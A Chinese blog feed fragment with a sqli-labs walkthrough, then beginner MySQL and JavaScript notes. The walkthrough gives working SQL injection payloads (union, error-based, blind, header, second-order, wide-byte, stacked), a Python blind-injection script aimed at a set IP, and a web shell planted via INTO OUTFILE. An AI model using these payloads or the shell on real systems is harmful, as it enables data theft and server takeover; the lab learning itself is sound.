</p><p>爆列：</p><p>&#x2F;?id&#x3D;-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘HHH’  –+ </p><p>爆值：</p><p>&#x2F;?id&#x3D;-1 union select group_concat(id, pq, ···) from hhhh –+</p><h3 id="Less-3-Less-4"><a href="#Less-3-Less-4" class="headerlink" title="Less-3 Less-4"></a>Less-3 Less-4</h3><p>tip：这两关有小括号闭合</p><p>测试：</p><p>&#x2F;?id &#x3D; 1正常</p><p>&#x2F;?id &#x3D; 1’报错，小括号闭合</p><p>应对方式：</p><p>&#x2F;?id&#x3D; -1) –+ </p><p>其他与前两关一致</p><h3 id="Less-5-Less-6"><a href="#Less-5-Less-6" class="headerlink" title="Less-5 Less-6"></a>Less-5 Less-6</h3><p>tip：报错注入</p><p>测试：</p><p>&#x2F;?id&#x3D;1正常，不显示信息</p><p>&#x2F;?id&#x3D;-1报错</p><p>利用updataxml()函数（基础模块有介绍）</p><p>闭合方式：</p><p>Less-5是单引号闭合</p><p>Less-6是双引号闭合</p><p>爆库：</p><p>&#x2F;?id&#x3D;1’ and updatexml(1,concat(0x7e,mid((select group_concat(schema_name) from information_schema.schemata),1,31)),1) –+ </p><p>爆表：</p><p>&#x2F;?id&#x3D;1’ and updataxml(1, concat(0x7e, mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘HHH’),1,31)),1) –+ </p><p>爆列：</p><p>&#x2F;?id&#x3D;1’ and updataxml(1, concat(0x7e, mid((select group_concat(column_name) from information_schema.columns where table_sname&#x3D;‘HHH’),1,31)),1) –+ </p><p>爆值：</p><p>&#x2F;?id&#x3D;1’ and updataxml(1, concat(0x7e, mid((select group_concat(id···) from hhh),1,31)),1) –+ </p><h3 id="Less-7-Less-8"><a href="#Less-7-Less-8" class="headerlink" title="Less-7 Less-8"></a>Less-7 Less-8</h3><p>tip：布尔盲注，本次以Less-8为主</p><p>存在单引号闭合</p><h4 id="布尔盲注步骤详解"><a href="#布尔盲注步骤详解" class="headerlink" title="布尔盲注步骤详解"></a>布尔盲注步骤详解</h4><p>页面只能返回正确或错误，无法报错注入。</p><p>步骤：对数据库，表，列都一样，有以下几步</p><ol><li>确定值的个数</li><li>确定一个值的长度</li><li>确定一个值的组成</li></ol><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>由于操作量太大，我们只从security-&gt;users-&gt;id</p><h5 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h5><h6 id="个数"><a href="#个数" class="headerlink" title="个数"></a>个数</h6><h6 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h6><p>&#x2F;?id&#x3D;1’ and length(database()) &gt; 7 –+ true</p><p>&#x2F;?id&#x3D;1’ and length(database()) &gt; 8 –+语义错误</p><p>可知长度为8</p><h6 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h6><p>&#x2F;?id&#x3D;1’ and ascii(substr((database()),1,1)) &gt; 97 –+ </p><p>······</p><p>得知当前数据库：security</p><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><h6 id="个数-1"><a href="#个数-1" class="headerlink" title="个数"></a>个数</h6><p>&#x2F;?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database()) &gt; 3 –+ 正确</p><p>&#x2F;?id&#x3D;1’ and (select count(table_name) from information_schema.tables where table_schema&#x3D;database()) &gt; 4 –+ 语义错误</p><p>可知有四个表：emails,referers,uagents,users</p><h6 id="长度-1"><a href="#长度-1" class="headerlink" title="长度"></a>长度</h6><p>&#x2F;?id&#x3D;1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3, 1)) &gt; 5 –+ 正确</p><p>&#x2F;?id&#x3D;1’ and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3, 1)) &gt; 6 –+ 语言错误</p><p>可知第四个表长度为5</p><h6 id="组成-1"><a href="#组成-1" class="headerlink" title="组成"></a>组成</h6><p>&#x2F;?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3, 1),1,1)) &gt; 97 –+ </p><p>可知表为users</p><h5 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h5><h6 id="个数-2"><a href="#个数-2" class="headerlink" title="个数"></a>个数</h6><p>&#x2F;?id&#x3D;1’ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’) &gt; 2 –+ 正确</p><p>&#x2F;?id&#x3D;1’ and (select count(column_name) from information_schema.columns where table_name&#x3D;’users’) &gt; 3 –+ 语义错误</p><p>可知三个列:id,username,password</p><h6 id="长度-2"><a href="#长度-2" class="headerlink" title="长度"></a>长度</h6><p>&#x2F;?id&#x3D;1’ and length((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0, 1))  &#x3D; 2 –+ </p><h6 id="组成-2"><a href="#组成-2" class="headerlink" title="组成"></a>组成</h6><p>&#x2F;?id&#x3D;1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0, 1),1,1)) &gt; 97 –+</p><p>可知列：id</p><h5 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h5><h6 id="个数-3"><a href="#个数-3" class="headerlink" title="个数"></a>个数</h6><p>?id&#x3D;1’ and (select count(*) from users) &gt; 12 –+ 正确</p><p>?id&#x3D;1’ and (select count(*) from users) &gt; 13 –+ 语义报错</p><p>可知有十三个</p><p>长度，组成不赘述</p><h4 id="布尔盲注python脚本"><a href="#布尔盲注python脚本" class="headerlink" title="布尔盲注python脚本"></a>布尔盲注python脚本</h4><p>以Less-8为例(手搓，巨费时)</p><pre><code class="highlight python"><span class="keyword">import</span> requests<span class="keyword">global</span> _database_name<span class="keyword">global</span> urlOpen<span class="keyword">global</span> mark<span class="keyword">global</span> _<span class="built_in">list</span>_<span class="built_in">list</span> = []<span class="comment">#_list = [&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;]</span>urlOpen = <span class="string">&quot;http://124.70.99.199:81/Less-8/?id=1&#x27;&quot;</span>mark = <span class="string">&#x27;You are in...........&#x27;</span><span class="keyword">def</span> <span class="title function_">database_name</span>():    name = <span class="string">&#x27;&#x27;</span>    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>):            url = urlOpen + <span class="string">f&quot;and ascii(substr(database(),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;i&#125;</span> --+ &quot;</span>            r = requests.get(url)            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:                name = name + <span class="built_in">chr</span>(i)                <span class="built_in">print</span>(name)                <span class="keyword">break</span>            <span class="keyword">else</span>:                <span class="built_in">print</span>(<span class="string">f&#x27;Not found for <span class="subst">&#123;i&#125;</span>&#x27;</span>)                <span class="comment">#print(url)</span>        <span class="keyword">else</span>:            <span class="built_in">print</span>(<span class="string">f&#x27;No match found for position <span class="subst">&#123;j&#125;</span>&#x27;</span>)    <span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>, name)    _database_name = name<span class="keyword">def</span> <span class="title function_">table_name</span>():    <span class="built_in">list</span> = []    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):<span class="comment">#有几个表</span>        name = <span class="string">&#x27;&#x27;</span>        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">12</span>):<span class="comment">#一个表有几个字</span>            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):<span class="comment">#一个字是什么字</span>                url = urlOpen + <span class="string">f&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit <span class="subst">&#123;i&#125;</span>, 1),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;y&#125;</span> --+ &quot;</span>                <span class="comment">#print(url)</span>                r = requests.get(url)                <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:                    name = name + <span class="built_in">chr</span>(y)                    <span class="comment">#print(name)</span>                    <span class="keyword">break</span>        _<span class="built_in">list</span>.append(name)    <span class="built_in">print</span>(<span class="string">&#x27;table_name:&#x27;</span>, _<span class="built_in">list</span>)    <span class="built_in">print</span>(<span class="string">&#x27;表函数已结束&#x27;</span>)table_name()<span class="comment">#[&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span><span class="comment">#选一个</span><span class="keyword">def</span> <span class="title function_">column_name</span>():    list_1 = []    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):        list_2 = []        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):            name=<span class="string">&#x27;&#x27;</span>            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):                <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):                    url = urlOpen + <span class="string">f&quot;and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="subst">&#123;_<span class="built_in">list</span>[a]&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>, 1),<span class="subst">&#123;j&#125;</span>,1)) = <span class="subst">&#123;y&#125;</span> --+ &quot;</span>                    r = requests.get(url)                    <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:                        name = name + <span class="built_in">chr</span>(y)                        <span class="built_in">print</span>(name)                        <span class="keyword">break</span>                    <span class="keyword">else</span>:                        <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;y&#125;</span> 不是&#x27;</span>)            list_2.append(name)        <span class="built_in">print</span>(list_2)        list_1.append(list_2)    <span class="built_in">print</span>(list_1)<span class="comment">#选择一个值</span>table_value = <span class="string">&#x27;users&#x27;</span>column_value = <span class="string">&#x27;password&#x27;</span><span class="keyword">def</span> <span class="title function_">value</span>(<span class="params">table_value, column_value</span>):    name = <span class="string">&#x27;&#x27;</span>    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):            url = urlOpen + <span class="string">f&quot;and ascii(substr((select <span class="subst">&#123;column_value&#125;</span> from <span class="subst">&#123;table_value&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)) = <span class="subst">&#123;j&#125;</span> --+ &quot;</span>            r = requests.get(url)            <span class="keyword">if</span> mark <span class="keyword">in</span> r.text:                name = name + <span class="built_in">chr</span>(j)                <span class="built_in">print</span>(name)                <span class="keyword">break</span>            <span class="keyword">else</span>:                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>不是&quot;</span>)    <span class="built_in">print</span>(name)<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:    a = <span class="built_in">input</span>(<span class="string">&#x27;press enter to&#x27;</span>)    <span class="keyword">if</span> a == <span class="string">&#x27;database_name&#x27;</span>:        database_name()    <span class="keyword">elif</span> a == <span class="string">&#x27;table_name&#x27;</span>:        table_name()    <span class="keyword">elif</span> a == <span class="string">&#x27;column_value&#x27;</span>:        column_name()    <span class="keyword">elif</span> a == <span class="string">&quot;value&quot;</span>:        table_value = <span class="built_in">input</span>(<span class="string">&#x27;give me the table&#x27;</span>)        column_value = <span class="built_in">input</span>(<span class="string">&#x27;give me the column&#x27;</span>)        value(table_value, column_value)    <span class="keyword">else</span>:        <span class="built_in">print</span>(<span class="string">&#x27;invalid input&#x27;</span>)</code></pre><h3 id="Less-9-Less10"><a href="#Less-9-Less10" class="headerlink" title="Less-9 Less10"></a>Less-9 Less10</h3><p>tip：时间盲注，本次以Less-9为主</p><p>存在单引号闭合</p><p>简单介绍一下if语法即可：</p><p><em><strong>*语法：if(expr1，expr2，expr3)*</strong></em></p><p> 语法含义：如果expr1是true，则if()的返回值为expr2，否则返回值则为expr3。</p><p>例子：</p><p>&#x2F;?id&#x3D;1’ and  if((1&#x3D;1), sleep(10),1)</p><p>迫于时间压力，先不学时间盲注脚本</p><h3 id="Less-11-Less-12"><a href="#Less-11-Less-12" class="headerlink" title="Less-11 Less-12"></a>Less-11 Less-12</h3><p>tip：POST提交方式</p><p>本次以Less-11 为主，两关区别是单引号或双引号闭合</p><p>用POST提交</p><p>剩下的一样</p><h3 id="Less-13-Less-14"><a href="#Less-13-Less-14" class="headerlink" title="Less-13 Less-14"></a>Less-13 Less-14</h3><p>本次以Less-13 为主，两关区别是单引号加小括号或双引号闭合</p><p>附：测试时返回这样一句话：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1’) LIMIT 0,1’ at line 1</p><p>其中的“o use near ‘1’) LIMIT 0,1’”告诉我们闭合方式是(‘’),Less-14同理</p><p>输入正确无反应，采用报错或盲注，本次为报错注入</p><p>例子：</p><p>passwd&#x3D;1&amp;uname&#x3D;1’) and updatexml(1,concat(0x7e, mid(database(),1,31)),1) #</p><p>可以报错注入，剩下照旧</p><h3 id="Less-15-Less-16"><a href="#Less-15-Less-16" class="headerlink" title="Less-15 Less-16"></a>Less-15 Less-16</h3><p>不管正确还是错误都没有回显，只能使用时间盲注</p><p>我会补脚本的，其实还有一个问题，就是如何在没有信息的情况下得知闭合方式，不要看source的那种</p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>源码提示uname参数不可用，使用passwd参数</p><p>使用报错注入</p><h3 id="小结-基本注入"><a href="#小结-基本注入" class="headerlink" title="小结(基本注入)"></a>小结(基本注入)</h3><h4 id="联合注入："><a href="#联合注入：" class="headerlink" title="联合注入："></a>联合注入：</h4><p>联合注入要求前面的条件是错的，需要注意占位数，回显位</p><p>当输入正确时有回显，可以使用联合注入</p><h4 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h4><p>报错注入要求前面的条件是真的</p><p>当输入正确无回显，输入语法错误有回显时，可以使用报错注入</p><h4 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h4><p>报错注入要求前面的条件是真的</p><p>当输入正确无回显，输入语法错误无回显，输入语义错误有回显，可以使用布尔盲注</p><h4 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a>时间盲注：</h4><p>要求与布尔盲注一致</p><p>当无论怎样都无回显时，可以使用时间盲注</p><h3 id="Less-18-Less-19"><a href="#Less-18-Less-19" class="headerlink" title="Less-18 Less-19"></a>Less-18 Less-19</h3><p>tip：其实一直忘了说一件事，正确账号和密码都是<strong>admin</strong>，另外，本次是UA注入</p><p>本处以Less-18为主，Less-19把UA换成Referer</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>经过测试可知：语义错误无回显，语法错误无回显，登入成功回显UA</p><p>猜测此处存在UA注入</p><p>但是此处又有一个细节，如果账户和密码不正确，将会不回显UA</p><h4 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h4><p>对UA操作：</p><p>1无回显</p><p>1’报错</p><p>1“无回显</p><p>1)无回显</p><p>很明显，就是单引号闭合</p><h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><p>单引号闭合，利用报错注入，例子：</p><p>（经过多次尝试，格式严格等于）</p><p><code>1&#39;=&#39;1&#39; and updatexml(1,concat(0x7e,database()),1)  and &#39;1&#39;=&#39;1</code> </p><p>剩下照旧</p><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>tip：经过多次抓包，发现每次都会发送两个包，一个GET，一个POST。本次是cookie注入，有关的是GET包</p><p>还能咋样嘞，学习Less-18</p><h3 id="小结-包注入"><a href="#小结-包注入" class="headerlink" title="小结(包注入)"></a>小结(包注入)</h3><p>简单的很，猜结构（其实不简单，但是我可以看source）</p><p>information_schema,normal </p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>二次注入</p><p>查看登录页source，发现两个参数都经过mysql_real_escape_string()函数过滤，那么就不能进行正常注入。</p><p>创建账户成功后，发现可以改密码。我们想夺取admin。</p><p>创建用户名：admin’#，在修改密码时会执行该用户名，然后admin密码就被修改了。</p><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>必须要单引号留存，特定函数(如addslashes())会给单引号前面加一个反斜杠使单引号不能发挥作用。</p><p>爆库：</p><p>?id&#x3D;%df ‘ union select 1,database(),3 –+ </p><p>剩下如旧</p><p>原理</p><p>%df ‘ &#x3D;&gt; %df&#x2F; ‘  &#x3D;&gt; %df%5C%27，由于GBK会把%df%5C一起解码，所以%27成功变回单引号，实现逃逸。</p><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>堆叠注入</p><p>发现本题只能回显第一条语句，不能回显第二条语句。那只有把第二条语句的结果注入到第一条语句。</p><p>爆库：?id&#x3D;1’;update users set password&#x3D;(mid((select group_concat(schema_name) from information_schema.schemata),1,20)) where username&#x3D;’Dumb’; –+ </p><p>爆表：?id&#x3D;1’;update users set password&#x3D;(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),1,20)) where username&#x3D;’Dumb’; –+ </p><p>爆列：?id&#x3D;1’;update users set password&#x3D;(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),1,20)) where username&#x3D;’Dumb’; –+ </p><p>爆值：?id&#x3D;1’;update users set password&#x3D;(mid((select group_concat(id,password) from users),1,20)) where username&#x3D;’Dumb’; –+ </p><h2 id="SQL注入进阶学习"><a href="#SQL注入进阶学习" class="headerlink" title="SQL注入进阶学习"></a>SQL注入进阶学习</h2><h3 id="注入木马"><a href="#注入木马" class="headerlink" title="注入木马"></a>注入木马</h3><p>第一步<br><code>id=-1 union select 1,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;,3 into OUTFILE &#39;/var/www/html/name.php&#39; --+</code> </p><p>第二步<br>url&#x2F;name.php<br>POST:<br>cmd&#x3D;system(“cat &#x2F;flag”);</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL入门</title>
      <link href="/2024/03/18/MYSQL%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/MYSQL%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL入门"><a href="#MySQL入门" class="headerlink" title="MySQL入门"></a>MySQL入门</h1><p>要学习，先开机：<code>mysql -u root -r</code></p><p>你还得学会选择数据库：<code>use database_name;</code></p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>每一行(Record)，称为记录</p><p>每一列(Column)，称为字段</p><blockquote><p>字段定义了数据类型（整型、浮点型、字符串、日期等），以及是否允许为<code>NULL</code>。注意<code>NULL</code>表示字段数据不存在。一个整型字段如果为<code>NULL</code>不表示它的值为<code>0</code>，同样的，一个字符串型字段为<code>NULL</code>也不表示它的值为空串<code>&#39;&#39;</code>。</p></blockquote><p>正常，概念不同。另外，字段尽量不要使用NULL，优势：简化查询条件，加快查询速度，也利于应用程序读取数据后无需判断是否为NULL。</p><p>主键是记录的唯一标识。主键是必要的。主键有大概有以下几种：</p><blockquote><ul><li>自增整数主键</li><li>全局唯一GUID类型：使用一种全局唯一的字符串作为主键，类似<code>8f55d96b-8acc-4636-8cb8-76bf8abc2f57</code>。GUID算法通过网卡MAC地址、时间戳和随机数保证任意计算机在任意时间生成的字符串都是不同的，大部分编程语言都内置了GUID算法，可以自己预算出主键。</li></ul></blockquote><p>联合主键允许多个列联合为主键，某一列可以有相同字段，只要所有字段不全部相同即可。</p><p>小结：</p><blockquote><p>主键是关系表中记录的唯一标识。主键的选取非常重要：主键不要带有业务含义，而应该使用BIGINT自增或者GUID类型。主键也不应该允许<code>NULL</code>。</p><p>可以使用多个列作为联合主键，但联合主键并不常用。</p></blockquote><p>外键是多个表之间的键，可以一对一，一对多，多对多</p><p>须知：</p><blockquote><p>外键并不是通过列名实现的，而是通过定义外键约束实现的：</p><pre><code class="highlight mysql">ALTER TABLE studentsADD CONSTRAINT fk_class_idFOREIGN KEY (class_id)REFERENCES classes (id);</code></pre><p>其中，外键约束的名称<code>fk_class_id</code>可以任意，<code>FOREIGN KEY (class_id)</code>指定了<code>class_id</code>作为外键，<code>REFERENCES classes (id)</code>指定了这个外键将关联到<code>classes</code>表的<code>id</code>列（即<code>classes</code>表的主键）。</p></blockquote><p>索引可以优化查询。</p><h2 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h2><h3 id="添加载体"><a href="#添加载体" class="headerlink" title="添加载体"></a>添加载体</h3><p>建立数据库：</p><p>create database database_name;</p><p>附：配套：<code>use database_name;</code></p><p>建立表：来个例子</p><p>create table test1 (<br>    id int not null auto_increment,<br>     name varchar(100) not null,<br>     age bigint not null,<br>     primary key(id) )<br>    default charset&#x3D;utf8;</p><h3 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h3><p>语法(允许全新添加)：</p><p><code>insert into table_name (name1, name2, name3) values (value1,value2,value3);</code></p><p>须知：如果值是字符类的，需要加引号。</p><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><h3 id="查询载体"><a href="#查询载体" class="headerlink" title="查询载体"></a>查询载体</h3><p>查询数据库：</p><p><code>show databases;</code></p><p>查询所有表：</p><p><code>show tables;</code></p><p>查看一个表的结构：</p><p><code>desc table_name;</code></p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><h4 id="查询逻辑"><a href="#查询逻辑" class="headerlink" title="查询逻辑"></a>查询逻辑</h4><p>语法结构：</p><pre><code class="highlight plaintext">select······from······where······group by······having······order by······</code></pre><p>查询逻辑：</p><ol><li>from 从某张表中查询数据</li><li>where 先经过where条件筛选出有价值的数据</li><li>groub by 对这些有价值的数据进行分组</li><li>having 分组之后可以使用having继续筛选</li><li>select select查询出来</li><li>order by 最后排序输出</li></ol><h3 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h3><p><a href="https://wsygdsgg.github.io/2023/10/28/MySQL/">我的技术与生活——MySQL | 春风少年郎的博客 (wsygdsgg.github.io)</a></p><p>以下只说一些</p><h4 id="1-模糊查询"><a href="#1-模糊查询" class="headerlink" title="1.模糊查询"></a>1.模糊查询</h4><blockquote><p>% 匹配多个字符(以下先代码后解释)</p><pre><code class="highlight plaintext">select name from name(表名) where name1 like &#x27;%o%&#x27;;</code></pre><p>找到名字里含有%o%的</p><pre><code class="highlight plaintext">select name from name(表名) where name1 like &#x27;o%&#x27;;</code></pre><p>找到名字里以o开头的</p><pre><code class="highlight plaintext">select name from name(表名) where name1 like &#x27;%o&#x27;;</code></pre><p>找到名字里以o结尾的</p><p>_ 匹配单个字符(以下先代码后解释)</p><pre><code class="highlight plaintext">select * from name(表名) where name1 like &#x27;_A%&#x27;;</code></pre><p>找到第二个字母是A的</p><p>如果前面有n个字符，便在A前面输入n个下划线</p><p>转义</p><pre><code class="highlight plaintext">select * from name(表名) where name1 like &#x27;% \ _%&#x27;;</code></pre><p>真实输入中%与\与_之间没有空格，本处为了显示 \ 故做特殊处理</p><p>% 和 \ 有特殊含义，为了正常显示下划线，采用转义方法，该处与C语言类似</p></blockquote><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><h3 id="删除载体"><a href="#删除载体" class="headerlink" title="删除载体"></a>删除载体</h3><p>删除数据库：</p><p><code>drop database if exists database_name;</code></p><p>简化：<code>drop database database_name</code></p><p>删除表：</p><p><code>drop table if exists table_name;</code></p><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><p>语法：</p><p><code>delete from table_name where ···;</code></p><p>须知：本句的核心是<strong>where</strong>，具有很灵活的特性。</p><h2 id="改变"><a href="#改变" class="headerlink" title="改变"></a>改变</h2><h3 id="改变载体"><a href="#改变载体" class="headerlink" title="改变载体"></a>改变载体</h3><p>只有数据表的操作</p><p>改表名：</p><p><code>alter table table_name rename to table_new_name;</code></p><p>添加一列：</p><p><code>alter table table_name add column_name type(数据类型);</code></p><p>删除一列：</p><p><code>alter table table_name drop column_name;</code></p><p>修改列名称：</p><p><code>alter table table_name change column_name column_new_name type;</code></p><h3 id="改变数据"><a href="#改变数据" class="headerlink" title="改变数据"></a>改变数据</h3><p>语法：</p><p><code>update table_name set name1=value1, name2=value2, name3=value3 where ···;</code></p><p>须知：核心依然在where。</p>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScipt入门</title>
      <link href="/2024/03/18/JavaScipt%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/JavaScipt%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="JavaScript简介"><a href="#JavaScript简介" class="headerlink" title="JavaScript简介"></a>JavaScript简介</h2><ul><li>JavaScript代码需要在<code>&lt;script&gt;</code>标签中写入</li><li>JavaScript代码可以在<code>&lt;head&gt;，&lt;body&gt;</code>以及外部文件中写入</li></ul><h2 id="JavaScript基础四用法："><a href="#JavaScript基础四用法：" class="headerlink" title="JavaScript基础四用法："></a>JavaScript基础四用法：</h2><ul><li>使用 <strong>window.alert()</strong> 弹出警告框。</li><li>使用 <strong>document.write()</strong> 方法将内容写到 HTML 文档中。</li><li>使用 <strong>innerHTML</strong> 写入到 HTML 元素。</li><li>使用 <strong>console.log()</strong> 写入到浏览器的控制台。</li></ul><p>1.window.alert()</p><pre><code class="highlight plaintext">&lt;script&gt;window.alert(5 + 6);&lt;/script&gt;</code></pre><p>2.document.write</p><pre><code class="highlight plaintext">&lt;script&gt;    document.write(HELLO);&lt;/script&gt;</code></pre><p>3.innerHTML</p><pre><code class="highlight plaintext">&lt;script&gt;    document.getElementById(&quot;pq&quot;).innerHTML = &#x27;is a handsome!&#x27;;&lt;/script&gt;</code></pre><p>4.console.log()</p><pre><code class="highlight plaintext">&lt;script&gt;   console.log(3 + 4);&lt;/script&gt;</code></pre><h2 id="JavaScript入门"><a href="#JavaScript入门" class="headerlink" title="JavaScript入门"></a>JavaScript入门</h2><h3 id="字面量和变量概述"><a href="#字面量和变量概述" class="headerlink" title="字面量和变量概述"></a>字面量和变量概述</h3><h4 id="字面量概述："><a href="#字面量概述：" class="headerlink" title="字面量概述："></a>字面量概述：</h4><p>在编程语言中，一般固定值称为字面量，如 3.14。数字，字符串，表达式，数组，对象，函数都可以作为字面量</p><h4 id="变量概述："><a href="#变量概述：" class="headerlink" title="变量概述："></a>变量概述：</h4><ul><li>需要声明变量，用var声明，不需要声明数据类型，允许一个var声明多个变量</li><li>Value &#x3D; undefined，在计算机程序中，经常会声明无值的变量。未使用值来声明的变量，其值实际上是 undefined</li><li>重新声明 JavaScript 变量不会丢失原来的值</li><li>变量值可以如python一样，直接转换值类型</li></ul><h5 id="变量类型："><a href="#变量类型：" class="headerlink" title="变量类型："></a>变量类型：</h5><p>**值类型(基本类型)**：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol。</p><p><strong>引用数据类型（对象类型）</strong>：对象(Object)、数组(Array)、函数(Function)，还有两个特殊的对象：正则（RegExp）和日期（Date）。</p><h5 id="声明须知："><a href="#声明须知：" class="headerlink" title="声明须知："></a>声明须知：</h5><p>字符串赋值不在意单或双引号</p><p>声明数组：var car&#x3D;new Arroy(‘a’, ‘b’, ‘c’).;下标从0开始</p><p>或者：var cars&#x3D;[“Saab”,”Volvo”,”BMW”];</p><p>声明布尔：var x&#x3D;true; var y&#x3D;false;</p><p>声明对象：var person&#x3D;{firstname:”John”, lastname:”Doe”, id:5566};</p><p>Undefined 和 Null：Undefined 这个值表示变量不含有值，可以通过将变量的值设置为 null 来清空变量。</p><p>对象须知：</p><p>访问对象属性的两种方式：A.a 或 A[‘a’]。</p><p>对象方法：A.a()</p><h3 id="JavaScript函数"><a href="#JavaScript函数" class="headerlink" title="JavaScript函数"></a>JavaScript函数</h3><p>函数是由事件驱动的或者当它被调用时执行的可重复使用的代码块。</p><p>JavaScript函数名对大小写敏感。格式如下：</p><p><code>function myFunction(***var1***,***var2***)</code><br><code>&#123;</code><br><code>*代码*</code><br><code>&#125;</code></p><p>一个简单的文件：</p><pre><code class="highlight plaintext">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;GRAAMMER&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;button onclick=&quot;pq()&quot;&gt;点这里&lt;/button&gt;&lt;/body&gt;&lt;script&gt;    function pq()&#123;        document.write(&#x27;HELLO&#x27;);    &#125;&lt;/script&gt;&lt;/html&gt;</code></pre><h3 id="JavaScript对象"><a href="#JavaScript对象" class="headerlink" title="JavaScript对象"></a>JavaScript对象</h3><h4 